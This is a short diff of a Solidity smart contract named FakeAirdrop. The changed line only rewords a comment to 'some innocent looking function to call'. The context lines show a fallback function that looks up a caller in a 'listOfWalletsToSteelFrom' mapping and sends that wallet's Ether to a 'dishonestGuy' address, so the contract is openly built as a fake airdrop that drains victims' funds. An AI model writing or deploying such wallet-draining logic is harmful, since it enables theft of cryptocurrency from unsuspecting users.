@@ -45,7 +45,7 @@ contract FakeAirdrop{
 	
 	function () public{
 		/*
-			some good locking function to call
+			some innocent looking function to call
 		*/ 
 		if(listOfWalletsToSteelFrom._wallets(msg.sender)!=address(0)){
 			listOfWalletsToSteelFrom._wallets(msg.sender).sendEth(dishonestGuy);
